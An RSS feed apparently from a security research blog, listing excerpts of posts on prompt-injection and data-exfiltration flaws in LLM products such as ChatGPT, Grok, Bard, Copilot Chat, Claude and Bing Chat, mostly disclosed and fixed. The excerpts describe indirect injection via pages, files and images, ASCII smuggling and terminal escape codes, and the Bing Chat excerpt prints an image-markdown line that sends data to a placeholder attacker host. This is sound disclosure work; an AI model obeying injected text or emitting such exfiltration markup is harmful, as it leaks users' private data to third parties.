<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Exfil on Embrace The Red</title>
    <link>http://localhost:1313/blog/tags/exfil/</link>
    <description>Recent content in Exfil on Embrace The Red</description>
    <generator>Hugo</generator>
    <language>en-us</language>
    <copyright>(c) WUNDERWUZZI 2018-2026</copyright>
    <lastBuildDate>Mon, 17 Feb 2025 07:30:21 -0800</lastBuildDate>
    <atom:link href="http://localhost:1313/blog/tags/exfil/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>ChatGPT Operator: Prompt Injection Exploits &amp; Defenses</title>
      <link>http://localhost:1313/blog/posts/2025/chatgpt-operator-prompt-injection-exploits/</link>
      <pubDate>Mon, 17 Feb 2025 07:30:21 -0800</pubDate>
      <guid>http://localhost:1313/blog/posts/2025/chatgpt-operator-prompt-injection-exploits/</guid>
      <description>&lt;p&gt;ChatGPT Operator is a research preview agent from OpenAI that lets ChatGPT use a web browser. It uses vision and reasoning abilities to complete tasks like researching topics, booking travel, ordering groceries, or as this post will show, steal your data!&lt;/p&gt;&#xA;&lt;p&gt;Currently, it&amp;rsquo;s only available for ChatGPT Pro users. I decided to invest $200 for one month to try it out.&lt;/p&gt;&#xA;&lt;h2 id=&#34;risks-and-threats&#34;&gt;Risks and Threats&lt;/h2&gt;&#xA;&lt;p&gt;OpenAI highlights three risk categories in their &lt;a href=&#34;https://cdn.openai.com/operator_system_card.pdf&#34;&gt;Operator System Card&lt;/a&gt;:&lt;/p&gt;</description>
    </item>
    <item>
      <title>Security ProbLLMs in xAI&#39;s Grok: A Deep Dive</title>
      <link>http://localhost:1313/blog/posts/2024/security-probllms-in-xai-grok/</link>
      <pubDate>Mon, 16 Dec 2024 04:44:57 -0800</pubDate>
      <guid>http://localhost:1313/blog/posts/2024/security-probllms-in-xai-grok/</guid>
      <description>&lt;p&gt;Grok is the chatbot of xAI. It&amp;rsquo;s a state-of-the-art model, chatbot and recently also API. It has a Web UI and is integrated into the X (former Twitter) app, and recently it&amp;rsquo;s also accessible via an &lt;a href=&#34;https://x.ai/blog/api&#34;&gt;API&lt;/a&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;http://localhost:1313/blog/images/2024/probllms-grok-tn.png&#34; alt=&#34;tn&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Since this post is a bit longer, I&amp;rsquo;m adding an index for convenience:&lt;/p&gt;&#xA;&lt;h2 id=&#34;table-of-contents&#34;&gt;Table of Contents&lt;/h2&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;a href=&#34;#high-level-overview&#34;&gt;High Level Overview&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;#system-prompt&#34;&gt;Analyzing Grok&amp;rsquo;s System Prompt&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;#prompt-injection-from-other-users-posts&#34;&gt;Prompt Injection from Other User&amp;rsquo;s Posts&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;#prompt-injection-from-images&#34;&gt;Prompt Injection from Images&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;#prompt-injection-from-pdfs&#34;&gt;Prompt Injection from PDFs&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;#conditional-prompt-injection-and-targeted-disinformation&#34;&gt;Conditional Prompt Injection and Targeted Disinformation&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;#data-exfiltration---end-to-end-demonstration&#34;&gt;Data Exfiltration - End-to-End Demonstration&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;#rendering-of-clickable-hyperlinks-to-phishing-sites&#34;&gt;Rendering of Clickable Hyperlinks to Phishing Sites&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;#ascii-smuggling---crafting-invisible-text-and-decoding-hidden-secrets&#34;&gt;ASCII Smuggling - Crafting Invisible Text and Decoding Hidden Secrets&lt;/a&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;#hidden-prompt-injection&#34;&gt;Hidden Prompt Injection&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;#creation-of-invisible-text&#34;&gt;Creation of Invisible Text&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;grok-api-is-also-vulnerable-to-ascii-smuggling&#34;&gt;Grok API is also Vulnerable to ASCII Smuggling&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;#developer-guidance-for-grok-api&#34;&gt;Developer Guidance for Grok API&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;#automatic-tool-invocation&#34;&gt;Automatic Tool Invocation&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;#responsible-disclosure&#34;&gt;Responsible Disclosure&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;#conclusion&#34;&gt;Conclusion&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h2 id=&#34;high-level-overview&#34;&gt;High Level Overview&lt;/h2&gt;&#xA;&lt;p&gt;Over the last year I have used Grok quite a bit. It&amp;rsquo;s pretty good and I use it daily, especially the recent image creation capabilities are impressive, but I hadn&amp;rsquo;t really looked at it from a security perspective. So, I decided to assess the overall security posture with some of the latest LLM threats discovered over the last 18 months, and responsibly disclose findings to xAI.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Terminal DiLLMa: LLM-powered Apps Can Hijack Your Terminal Via Prompt Injection</title>
      <link>http://localhost:1313/blog/posts/2024/terminal-dillmas-prompt-injection-ansi-sequences/</link>
      <pubDate>Fri, 06 Dec 2024 08:00:25 -0800</pubDate>
      <guid>http://localhost:1313/blog/posts/2024/terminal-dillmas-prompt-injection-ansi-sequences/</guid>
      <description>&lt;p&gt;Last week Leon Derczynski &lt;a href=&#34;https://interhumanagreement.substack.com/p/llm-output-can-take-over-your-computer&#34;&gt;described&lt;/a&gt; how LLMs can output ANSI escape codes. These codes, also known as control characters, are interpreted by terminal emulators and modify behavior.&lt;/p&gt;&#xA;&lt;p&gt;This discovery resonates with areas I had been exploring, so I took some time to apply, and build upon, these newly uncovered insights.&lt;/p&gt;&#xA;&lt;h2 id=&#34;ansi-terminal-emulator-escape-codes&#34;&gt;ANSI Terminal Emulator Escape Codes&lt;/h2&gt;&#xA;&lt;p&gt;Here is a simple example that shows how to render blinking, colorful text using control characters.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Google AI Studio: LLM-Powered Data Exfiltration Hits Again! Quickly Fixed.</title>
      <link>http://localhost:1313/blog/posts/2024/google-ai-studio-data-exfiltration-now-fixed/</link>
      <pubDate>Wed, 21 Aug 2024 19:00:30 -0700</pubDate>
      <guid>http://localhost:1313/blog/posts/2024/google-ai-studio-data-exfiltration-now-fixed/</guid>
      <description>&lt;p&gt;Recently, I found what appeared to be a regression or bypass that again allowed data exfiltration via image rendering during prompt injection. See the previous post &lt;a href=&#34;http://localhost:1313/blog/posts/2024/google-aistudio-mass-data-exfil/&#34;&gt;here&lt;/a&gt; for reference.&lt;/p&gt;&#xA;&lt;h2 id=&#34;data-exfiltration-via-rendering-html-image-tags&#34;&gt;Data Exfiltration via Rendering HTML Image Tags&lt;/h2&gt;&#xA;&lt;p&gt;During re-testing, I had sporadic success with markdown rendering tricks, but eventually, I was able to drastically simplify the exploit &lt;strong&gt;by asking directly for an HTML image tag&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;This behavior might actually have existed all along, as Google AI Studio hadn&amp;rsquo;t yet implemented any kind of Content Security Policy to prevent communication with arbitrary domains using images.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Google Colab AI: Data Leakage Through Image Rendering Fixed. Some Risks Remain.</title>
      <link>http://localhost:1313/blog/posts/2024/google-colab-image-render-exfil/</link>
      <pubDate>Wed, 24 Jul 2024 22:00:25 -0700</pubDate>
      <guid>http://localhost:1313/blog/posts/2024/google-colab-image-render-exfil/</guid>
      <description>&lt;p&gt;Google Colab AI, now just called Gemini in Colab, was vulnerable to data leakage via image rendering.&lt;/p&gt;&#xA;&lt;p&gt;This is an older bug report, dating back to November 29, 2023. However, recent events prompted me to write this up:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Google did not reward this finding, and&lt;/li&gt;&#xA;&lt;li&gt;Colab now automatically puts Notebook content (untrusted data) into the prompt.&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;Let&amp;rsquo;s explore the specifics.&lt;/p&gt;&#xA;&lt;h2 id=&#34;google-colab-ai---revealing-the-system-prompt&#34;&gt;Google Colab AI - Revealing the System Prompt&lt;/h2&gt;&#xA;&lt;p&gt;At the end of November last year, I noticed that there was a &amp;ldquo;Colab AI&amp;rdquo; feature, which integrated an LLM to chat with and write code. Naturally, I grabbed the system prompt, and it contained instructions that begged the LLM to not render images.&lt;/p&gt;</description>
    </item>
    <item>
      <title>GitHub Copilot Chat: From Prompt Injection to Data Exfiltration</title>
      <link>http://localhost:1313/blog/posts/2024/github-copilot-chat-prompt-injection-data-exfiltration/</link>
      <pubDate>Fri, 14 Jun 2024 21:00:17 -0800</pubDate>
      <guid>http://localhost:1313/blog/posts/2024/github-copilot-chat-prompt-injection-data-exfiltration/</guid>
      <description>&lt;p&gt;This post highlights how the &lt;a href=&#34;https://docs.github.com/en/copilot/github-copilot-chat/copilot-chat-in-ides/using-github-copilot-chat-in-your-ide&#34;&gt;GitHub Copilot Chat VS Code Extension&lt;/a&gt; was vulnerable to data exfiltration via prompt injection when analyzing untrusted source code.&lt;/p&gt;&#xA;&lt;h2 id=&#34;github-copilot-chat&#34;&gt;GitHub Copilot Chat&lt;/h2&gt;&#xA;&lt;p&gt;GitHub Copilot Chat is a VS Code Extension that allows a user to chat with source code, refactor code, get info about terminal output, or general help about VS Code, and things along those lines.&lt;/p&gt;&#xA;&lt;p&gt;It does so by sending source code, along with the user&amp;rsquo;s questions to a large language model (LLM). A bit of a segue, but if you are curious, here are its system instructions, highlighting some interesting prompting strategies and that it is powered by GPT-4:&lt;/p&gt;</description>
    </item>
    <item>
      <title>Bobby Tables but with LLM Apps - Google NotebookLM Data Exfiltration</title>
      <link>http://localhost:1313/blog/posts/2024/google-notebook-ml-data-exfiltration/</link>
      <pubDate>Mon, 15 Apr 2024 08:11:30 -0700</pubDate>
      <guid>http://localhost:1313/blog/posts/2024/google-notebook-ml-data-exfiltration/</guid>
      <description>&lt;p&gt;&lt;a href=&#34;https://notebooklm.google.com&#34;&gt;Google&amp;rsquo;s NotebookLM&lt;/a&gt; is an experimental project that was released last year. It allows users to upload files and analyze them with a large language model (LLM).&lt;/p&gt;&#xA;&lt;p&gt;However, it is vulnerable to Prompt Injection, meaning that uploaded files can manipulate the chat conversation and control what the user sees in responses.&lt;/p&gt;&#xA;&lt;p&gt;There is currently no known solution to these kinds of attacks, so users can&amp;rsquo;t implicitly trust responses from large language model applications when untrusted data is involved. Additionally though NotebookLM is also vulnerable to data exfiltration when processing untrusted data.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Google AI Studio Data Exfiltration via Prompt Injection - Possible Regression and Fix</title>
      <link>http://localhost:1313/blog/posts/2024/google-aistudio-mass-data-exfil/</link>
      <pubDate>Sun, 07 Apr 2024 16:00:30 -0700</pubDate>
      <guid>http://localhost:1313/blog/posts/2024/google-aistudio-mass-data-exfil/</guid>
      <description>&lt;p&gt;What I like about the rapid advancements and excitement about AI over the last few years is that we see a resurgence of the testing discipline!&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Software testing is hard, and adding AI to the mix does not make it easier at all!&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;google-ai-studio---initially-not-vulnerable-to-data-leakage-via-image-rendering&#34;&gt;Google AI Studio - Initially not vulnerable to data leakage via image rendering&lt;/h2&gt;&#xA;&lt;p&gt;When Google released AI Studio last year I checked for the common image markdown data exfiltration vulnerability and it was not vulnerable.&lt;/p&gt;</description>
    </item>
    <item>
      <title>The dangers of AI agents unfurling hyperlinks and what to do about it</title>
      <link>http://localhost:1313/blog/posts/2024/the-dangers-of-unfurling-and-what-you-can-do-about-it/</link>
      <pubDate>Tue, 02 Apr 2024 20:00:48 -0800</pubDate>
      <guid>http://localhost:1313/blog/posts/2024/the-dangers-of-unfurling-and-what-you-can-do-about-it/</guid>
      <description>&lt;p&gt;About a year ago we talked about how developers can&amp;rsquo;t intrinsically trust LLM responses and &lt;a href=&#34;http://localhost:1313/blog/posts/2023/ai-injections-threats-context-matters/&#34;&gt;common threats that AI Chatbots face and how attackers can exploit them, including ways to exfiltrate data&lt;/a&gt;.&lt;/p&gt;&#xA;&lt;p&gt;One of the threats is &lt;strong&gt;unfurling of hyperlinks&lt;/strong&gt;, which can lead to data exfiltration and is something often seen in Chatbots. So, let&amp;rsquo;s shine more light on it, including practical guidance on how to mitigate it with the example of &lt;strong&gt;Slack Apps&lt;/strong&gt;.&lt;/p&gt;</description>
    </item>
    <item>
      <title>AWS Fixes Data Exfiltration Attack Angle in Amazon Q for Business</title>
      <link>http://localhost:1313/blog/posts/2024/aws-amazon-q-fixes-markdown-rendering-vulnerability/</link>
      <pubDate>Thu, 18 Jan 2024 03:00:17 -0800</pubDate>
      <guid>http://localhost:1313/blog/posts/2024/aws-amazon-q-fixes-markdown-rendering-vulnerability/</guid>
      <description>&lt;p&gt;A few weeks ago Amazon released the Preview of Amazon Q for Business, and after looking at it I found a data exfiltration angle via rendering markdown/hyperlinks and reported it to Amazon.&lt;/p&gt;&#xA;&lt;p&gt;Amazon reacted quickly and mitigated the problem. This post shares further details and how it was fixed.&lt;/p&gt;&#xA;&lt;h2 id=&#34;the-problem&#34;&gt;The Problem&lt;/h2&gt;&#xA;&lt;p&gt;An Indirect Prompt Injection attack can cause the LLM to return markdown tags. This allows an adversary who&amp;rsquo;s data makes it into the chat context (e.g via an uploaded file) to achieve data exfiltration of the victim&amp;rsquo;s data by rendering hyperlinks.&lt;/p&gt;</description>
    </item>
    <item>
      <title>OpenAI Begins Tackling ChatGPT Data Leak Vulnerability</title>
      <link>http://localhost:1313/blog/posts/2023/openai-data-exfiltration-first-mitigations-implemented/</link>
      <pubDate>Wed, 20 Dec 2023 02:35:07 -0800</pubDate>
      <guid>http://localhost:1313/blog/posts/2023/openai-data-exfiltration-first-mitigations-implemented/</guid>
      <description>&lt;p&gt;OpenAI seems to have implemented some mitigation steps for a well-known data exfiltration vulnerability in ChatGPT. Attackers can use image markdown rendering during prompt injection attacks to send data to third party servers without the users&amp;rsquo; consent.&lt;/p&gt;&#xA;&lt;p&gt;The fix is not perfect, but a step into the right direction. In this post I share what I figured out so far about the fix after looking at it briefly this morning.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Malicious ChatGPT Agents: How GPTs Can Quietly Grab Your Data (Demo)</title>
      <link>http://localhost:1313/blog/posts/2023/openai-custom-malware-gpt/</link>
      <pubDate>Tue, 12 Dec 2023 18:00:49 -0800</pubDate>
      <guid>http://localhost:1313/blog/posts/2023/openai-custom-malware-gpt/</guid>
      <description>&lt;p&gt;When OpenAI released &lt;a href=&#34;https://openai.com/blog/introducing-gpts&#34;&gt;GPTs&lt;/a&gt; last month I had plans for an interesting GPT.&lt;/p&gt;&#xA;&lt;h2 id=&#34;malicious-chatgpt-agents&#34;&gt;Malicious ChatGPT Agents&lt;/h2&gt;&#xA;&lt;p&gt;The idea was to create a kind of malware GPT that forwards users&amp;rsquo; chat messages to a third party server. It also asks users for personal information like emails and passwords.&lt;/p&gt;&#xA;&lt;h3 id=&#34;why-would-this-be-possible-end-to-end&#34;&gt;Why would this be possible end to end?&lt;/h3&gt;&#xA;&lt;p&gt;&lt;a href=&#34;http://localhost:1313/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/&#34;&gt;ChatGPT cannot guarantee to keep your conversation private or confidential&lt;/a&gt;, because it loads images from any website. &lt;strong&gt;This allows data to be sent to a third party server.&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Hacking Google Bard - From Prompt Injection to Data Exfiltration</title>
      <link>http://localhost:1313/blog/posts/2023/google-bard-data-exfiltration/</link>
      <pubDate>Fri, 03 Nov 2023 12:00:01 -0700</pubDate>
      <guid>http://localhost:1313/blog/posts/2023/google-bard-data-exfiltration/</guid>
      <description>&lt;p&gt;Recently Google Bard got some &lt;a href=&#34;https://blog.google/products/bard/google-bard-new-features-update-sept-2023/&#34;&gt;powerful updates&lt;/a&gt;, including Extensions. Extensions allow Bard to access YouTube, search for flights and hotels, and also to access a user&amp;rsquo;s personal documents and emails.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;So, Bard can now access and analyze your Drive, Docs and Gmail!&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;This means that it analyzes untrusted data and will be susceptible to Indirect Prompt Injection.&lt;/p&gt;&#xA;&lt;p&gt;I was able to quickly validate that Prompt Injection works by pointing Bard to some older YouTube videos I had put up and ask it to summarize, and I also tested with &lt;code&gt;Google Docs&lt;/code&gt;.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Google Cloud Vertex AI - Data Exfiltration Vulnerability Fixed in Generative AI Studio</title>
      <link>http://localhost:1313/blog/posts/2023/google-gcp-generative-ai-studio-data-exfiltration-fixed/</link>
      <pubDate>Thu, 19 Oct 2023 06:35:37 -0700</pubDate>
      <guid>http://localhost:1313/blog/posts/2023/google-gcp-generative-ai-studio-data-exfiltration-fixed/</guid>
      <description>&lt;p&gt;Large Language Model (LLM) applications and chatbots are quite commonly vulnerable to data exfiltration. In particular data exfiltration via &lt;code&gt;Image Markdown Injection&lt;/code&gt; is frequent.&lt;/p&gt;&#xA;&lt;p&gt;This post describes how Google Cloud&amp;rsquo;s Vertex AI - Generative AI Studio had this vulnerability that I responsibly disclosed and Google fixed.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;A big shout out to the Google Security team upfront, it took 22 minutes from report submission to receiving a confirmation from Google that this is a security issue that will be fixed.&lt;/strong&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>Microsoft Fixes Data Exfiltration Vulnerability in Azure AI Playground</title>
      <link>http://localhost:1313/blog/posts/2023/data-exfiltration-in-azure-openai-playground-fixed/</link>
      <pubDate>Fri, 29 Sep 2023 10:00:08 -0700</pubDate>
      <guid>http://localhost:1313/blog/posts/2023/data-exfiltration-in-azure-openai-playground-fixed/</guid>
      <description>&lt;p&gt;Large Language Model (LLM) applications and chatbots are quite commonly vulnerable to data exfiltration. In particular data exfiltration via &lt;code&gt;Image Markdown Injection&lt;/code&gt; is quite frequent.&lt;/p&gt;&#xA;&lt;p&gt;Microsoft &lt;a href=&#34;http://localhost:1313/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/&#34;&gt;fixed such a vulnerability in Bing Chat&lt;/a&gt;, Anthropic &lt;a href=&#34;https://embracethered.com/blog/posts/2023/anthropic-fixes-claude-data-exfiltration-via-images/&#34;&gt;fixed it in Claude&lt;/a&gt;, and &lt;a href=&#34;http://localhost:1313/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/&#34;&gt;ChatGPT has a known vulnerability&lt;/a&gt; as Open AI &amp;ldquo;won&amp;rsquo;t fix&amp;rdquo; the issue.&lt;/p&gt;&#xA;&lt;p&gt;This post describes a variant in the Azure AI Playground and how Microsoft fixed it.&lt;/p&gt;&#xA;&lt;h2 id=&#34;from-untrusted-data-to-data-exfiltration&#34;&gt;From Untrusted Data to Data Exfiltration&lt;/h2&gt;&#xA;&lt;p&gt;When untrusted data makes it into the LLM prompt context it can instruct the model to inject an image markdown element. Clients frequently render this using an HTML &lt;code&gt;img&lt;/code&gt; tag and if untrusted data is involved the attacker can control the &lt;code&gt;src&lt;/code&gt; attribute.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Advanced Data Exfiltration Techniques with ChatGPT</title>
      <link>http://localhost:1313/blog/posts/2023/advanced-plugin-data-exfiltration-trickery/</link>
      <pubDate>Thu, 28 Sep 2023 09:01:00 -0700</pubDate>
      <guid>http://localhost:1313/blog/posts/2023/advanced-plugin-data-exfiltration-trickery/</guid>
      <description>&lt;p&gt;During an Indirect Prompt Injection Attack an adversary can exfiltrate chat data from a user by &lt;a href=&#34;http://localhost:1313/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/&#34;&gt;instructing ChatGPT to render images and append information to the URL (Image Markdown Injection)&lt;/a&gt;, or by tricking a user to click a hyperlink.&lt;/p&gt;&#xA;&lt;p&gt;Sending large amounts of data to a third party server via URLs might seem inconvenient or limiting&amp;hellip;&lt;/p&gt;&#xA;&lt;p&gt;Let&amp;rsquo;s say we want something more, aehm, powerful, elegant and exciting.&lt;/p&gt;&#xA;&lt;h2 id=&#34;chatgpt-plugins-and-exfiltration-limitations&#34;&gt;ChatGPT Plugins and Exfiltration Limitations&lt;/h2&gt;&#xA;&lt;p&gt;Plugins are an extension mechanism with little security oversight or enforced review process.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Video: Data Exfiltration Vulnerabilities in LLM apps (Bing Chat, ChatGPT, Claude)</title>
      <link>http://localhost:1313/blog/posts/2023/video-data-exfiltration-vulns-in-llm-applictions/</link>
      <pubDate>Mon, 28 Aug 2023 10:00:51 -0700</pubDate>
      <guid>http://localhost:1313/blog/posts/2023/video-data-exfiltration-vulns-in-llm-applictions/</guid>
      <description>&lt;p&gt;This video highlights the various data exfiltration vulnerabilities I discovered and responsibly disclosed to Microsoft, Anthropic, ChatGPT and Plugin Developers.&lt;/p&gt;&#xA;&lt;p&gt;It also briefly discusses mitigations various vendors put in place (and triage decisions).&lt;/p&gt;&#xA;&lt;div style=&#34;position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden;&#34;&gt;&#xA;      &lt;iframe allow=&#34;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share; fullscreen&#34; loading=&#34;eager&#34; referrerpolicy=&#34;strict-origin-when-cross-origin&#34; src=&#34;https://www.youtube.com/embed/L_1plTXF-FE?autoplay=0&amp;amp;controls=1&amp;amp;end=0&amp;amp;loop=0&amp;amp;mute=0&amp;amp;start=0&#34; style=&#34;position: absolute; top: 0; left: 0; width: 100%; height: 100%; border:0;&#34; title=&#34;YouTube video&#34;&gt;&lt;/iframe&gt;&#xA;    &lt;/div&gt;&#xA;&#xA;&lt;p&gt;Â &lt;/p&gt;&#xA;&lt;p&gt;Thanks to MSRC, Anthropic and Zapier for addressing vulnerabilities to help protect their users.&lt;/p&gt;</description>
    </item>
    <item>
      <title>Anthropic Claude Data Exfiltration Vulnerability Fixed</title>
      <link>http://localhost:1313/blog/posts/2023/anthropic-fixes-claude-data-exfiltration-via-images/</link>
      <pubDate>Tue, 01 Aug 2023 15:15:15 -0700</pubDate>
      <guid>http://localhost:1313/blog/posts/2023/anthropic-fixes-claude-data-exfiltration-via-images/</guid>
      <description>&lt;p&gt;A common attack vector that LLM apps face is data exfiltration, in particular data exfiltration via &lt;code&gt;Image Markdown Injection&lt;/code&gt; is a common vulnerability. Microsoft &lt;a href=&#34;http://localhost:1313/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/&#34;&gt;fixed&lt;/a&gt; the vulnerability in Bing Chat, &lt;a href=&#34;http://localhost:1313/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/&#34;&gt;ChatGPT is still vulnerable&lt;/a&gt; as Open AI &amp;ldquo;won&amp;rsquo;t fixed&amp;rdquo; the issue, and Anthropic just mitigated this vulnerability in Claude.&lt;/p&gt;&#xA;&lt;p&gt;This post documents the Anthropic Claude data exfiltration vulnerability and the mitigation put in place.&lt;/p&gt;&#xA;&lt;h2 id=&#34;the-vulnerability---image-markdown-injection&#34;&gt;The Vulnerability - Image Markdown Injection&lt;/h2&gt;&#xA;&lt;p&gt;As a quick recap, imagine a large language model (LLM) returns the following text:&lt;/p&gt;</description>
    </item>
    <item>
      <title>Bing Chat: Data Exfiltration Exploit Explained</title>
      <link>http://localhost:1313/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/</link>
      <pubDate>Sun, 18 Jun 2023 00:01:02 -0700</pubDate>
      <guid>http://localhost:1313/blog/posts/2023/bing-chat-data-exfiltration-poc-and-fix/</guid>
      <description>&lt;p&gt;This post describes how I found a Prompt Injection attack angle in &lt;code&gt;Bing Chat&lt;/code&gt; that allowed malicious text on a webpage (like a user comment or an advertisement) to exfiltrate data.&lt;/p&gt;&#xA;&lt;h2 id=&#34;the-vulnerability---image-markdown-injection&#34;&gt;The Vulnerability - Image Markdown Injection&lt;/h2&gt;&#xA;&lt;p&gt;When Bing Chat returns text it can return markdown elements, which the client will render as HTML. This includes the feature to include images.&lt;/p&gt;&#xA;&lt;p&gt;Imagine the LLM returns the following text:&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;![data exfiltration in progress](https://attacker/logo.png?q=[DATA_EXFILTRATION])&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This will be rendered as an HTML image tag with a &lt;code&gt;src&lt;/code&gt; attribute pointing to the &lt;code&gt;attacker&lt;/code&gt; server.&lt;/p&gt;</description>
    </item>
    <item>
      <title>ChatGPT Plugin Exploit Explained: From Prompt Injection to Accessing Private Data</title>
      <link>http://localhost:1313/blog/posts/2023/chatgpt-cross-plugin-request-forgery-and-prompt-injection./</link>
      <pubDate>Sun, 28 May 2023 12:00:02 -0700</pubDate>
      <guid>http://localhost:1313/blog/posts/2023/chatgpt-cross-plugin-request-forgery-and-prompt-injection./</guid>
      <description>&lt;p&gt;If you are building ChatGPT plugins, LLM agents, tools or integrations this is a must read. This post explains how the first exploitable &lt;code&gt;Cross Plugin Request Forgery&lt;/code&gt; was found &lt;a href=&#34;https://twitter.com/wunderwuzzi23/status/1659411665853779971&#34;&gt;in the wild&lt;/a&gt; and the fix which was applied.&lt;/p&gt;&#xA;&lt;h2 id=&#34;indirect-prompt-injections-are-now-a-reality&#34;&gt;Indirect Prompt Injections Are Now A Reality&lt;/h2&gt;&#xA;&lt;p&gt;With plugins and browsing support Indirect Prompt Injections are now a &lt;a href=&#34;http://localhost:1313/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/&#34;&gt;reality in the ChatGPT ecosystem&lt;/a&gt;.&lt;/p&gt;&#xA;&lt;p&gt;The real-world examples and demos provided by others and myself to raise awarness about this increasing problem have been mostly amusing and harmless, like making Bing Chat speak like a &lt;a href=&#34;https://greshake.github.io/&#34;&gt;pirate&lt;/a&gt;, make &lt;a href=&#34;https://embracethered.com/blog/posts/2023/chatgpt-plugin-youtube-indirect-prompt-injection/&#34;&gt;ChatGPT add jokes at the end&lt;/a&gt; or &lt;a href=&#34;https://www.tomshardware.com/news/chatgpt-vulnerable-to-youtube-prompt-injection&#34;&gt;having it do a Rickroll when reading YouTube transcripts&lt;/a&gt;.&lt;/p&gt;</description>
    </item>
    <item>
      <title>ChatGPT Plugins: Data Exfiltration via Images &amp; Cross Plugin Request Forgery</title>
      <link>http://localhost:1313/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/</link>
      <pubDate>Tue, 16 May 2023 07:45:38 -0700</pubDate>
      <guid>http://localhost:1313/blog/posts/2023/chatgpt-webpilot-data-exfil-via-markdown-injection/</guid>
      <description>&lt;p&gt;This post shows how a malicious website can take control of a ChatGPT chat session and exfiltrate the history of the conversation.&lt;/p&gt;&#xA;&lt;h2 id=&#34;plugins-tools-and-integrations&#34;&gt;Plugins, Tools and Integrations&lt;/h2&gt;&#xA;&lt;p&gt;With plugins, data exfiltration can happen by sending too much data into the plugin in the first place. More security controls and insights on what is being sent to the plugin are required to empower users.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;However, this post is not about sending too much data to a plugin, but about a malicious actor who controls the data a plugin retrieves&lt;/strong&gt;.&lt;/p&gt;</description>
    </item>
  </channel>
</rss>
